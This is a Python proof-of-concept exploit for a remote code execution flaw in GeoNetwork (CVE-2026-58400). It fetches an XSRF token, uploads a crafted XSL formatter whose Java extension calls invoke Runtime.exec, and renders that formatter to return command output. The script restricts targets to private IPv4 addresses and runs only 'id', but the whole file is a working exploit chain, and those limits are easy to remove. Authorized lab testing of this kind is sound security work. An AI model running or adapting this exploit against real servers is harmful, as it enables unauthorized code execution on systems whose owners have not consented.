#!/usr/bin/env python3
"""Private-lab GeoNetwork formatter RCE check for CVE-2026-58400.

This proof of concept only connects to an explicitly supplied private IPv4
address and runs one fixed, harmless command (`id`). Use only in an authorized
disposable lab.
"""
import argparse
import html
import ipaddress
import re
import subprocess
import sys
import tempfile
import uuid
from pathlib import Path
from urllib.parse import urlsplit


def validate_base_url(value: str) -> str:
    parsed = urlsplit(value)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("Use an HTTP URL with an explicit private IPv4 address, e.g. http://10.10.10.5:8080/geonetwork")
    try:
        address = ipaddress.ip_address(parsed.hostname)
    except ValueError as exc:
        raise ValueError("Hostname must be a literal private IPv4 address") from exc
    if address.version != 4 or not address.is_private:
        raise ValueError("This lab script only permits private IPv4 addresses")
    if parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("Credentials, query strings, and fragments are not accepted")
    return value.rstrip("/")


def curl(args, *, timeout=30):
    return subprocess.run(
        ["curl", "--silent", "--show-error", "--max-time", str(timeout), *args],
        capture_output=True,
        text=True,
        check=False,
        timeout=timeout + 5,
    )


def get_xsrf(base_url: str, cookie_jar: str) -> str:
    response = curl([
        "--cookie-jar", cookie_jar,
        "--cookie", cookie_jar,
        f"{base_url}/srv/eng/catalog.search",
    ])
    if response.returncode:
        raise RuntimeError(f"Could not reach local lab: {response.stderr.strip()}")
    token = ""
    for line in Path(cookie_jar).read_text(encoding="utf-8").splitlines():
        if "XSRF-TOKEN" in line and not line.startswith("#"):
            token = line.split("\t")[-1].strip()
    if not token:
        raise RuntimeError("The local lab did not set an XSRF-TOKEN cookie")
    return token


def make_formatter() -> str:
    # Fixed benign command. No shell, command argument, callback, or payload input.
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html"/>
  <xsl:template match="/">
    <xsl:variable name="p"
        select="Runtime:exec(Runtime:getRuntime(), 'id')"
        xmlns:Runtime="java:java.lang.Runtime"/>
    <xsl:variable name="rc"
        select="Process:waitFor($p)" xmlns:Process="java:java.lang.Process"/>
    <xsl:variable name="is"
        select="Process:getInputStream($p)" xmlns:Process="java:java.lang.Process"/>
    <xsl:variable name="out"
        select="InputStream:readAllBytes($is)" xmlns:InputStream="java:java.io.InputStream"/>
    <html><body><pre><xsl:value-of select="String:new($out, 'UTF-8')"
        xmlns:String="java:java.lang.String"/></pre></body></html>
  </xsl:template>
</xsl:stylesheet>
'''


def run_lab(base_url: str, record_uuid: str) -> str:
    name = "lab" + uuid.uuid4().hex[:8]
    with tempfile.TemporaryDirectory(prefix="geonetwork-lab-") as temp_dir:
        cookie_jar = str(Path(temp_dir) / "cookies.txt")
        formatter_path = Path(temp_dir) / f"{name}.xsl"
        formatter_path.write_text(make_formatter(), encoding="utf-8")
        token = get_xsrf(base_url, cookie_jar)

        upload = curl([
            "--cookie", cookie_jar,
            "--cookie-jar", cookie_jar,
            "--header", f"X-XSRF-TOKEN: {token}",
            "--header", "Accept: application/json",
            "--form", f"file=@{formatter_path};filename={name}.xsl;type=application/xml",
            "--write-out", "\\n%{http_code}",
            "--output", "-",
            "--request", "POST",
            f"{base_url}/srv/api/formatters",
        ])
        if upload.returncode:
            raise RuntimeError(f"Formatter upload request failed: {upload.stderr.strip()}")
        body, _, status_text = upload.stdout.rpartition("\n")
        if status_text.strip() not in {"200", "201", "204"}:
            raise RuntimeError(f"Formatter upload returned HTTP {status_text.strip()}: {body[:300]}")

        render = curl([
            "--cookie", cookie_jar,
            "--header", "Accept: text/html",
            f"{base_url}/srv/api/records/{record_uuid}/formatters/{name}",
        ])
        if render.returncode:
            raise RuntimeError(f"Formatter render request failed: {render.stderr.strip()}")
        match = re.search(r"<body><pre>(.*?)</pre></body>", render.stdout, re.S)
        if not match:
            raise RuntimeError("No command output found. Check the lab version, record UUID, and application logs.")
        return html.unescape(match.group(1)).strip()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True,
                        help="Base URL of your authorized lab; must use a private IPv4 address")
    parser.add_argument("--uuid", required=True, help="UUID of a record in the local lab")
    args = parser.parse_args()
    try:
        base_url = validate_base_url(args.base_url)
        uuid.UUID(args.uuid)
        print(run_lab(base_url, args.uuid))
    except (ValueError, RuntimeError, subprocess.TimeoutExpired, FileNotFoundError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()

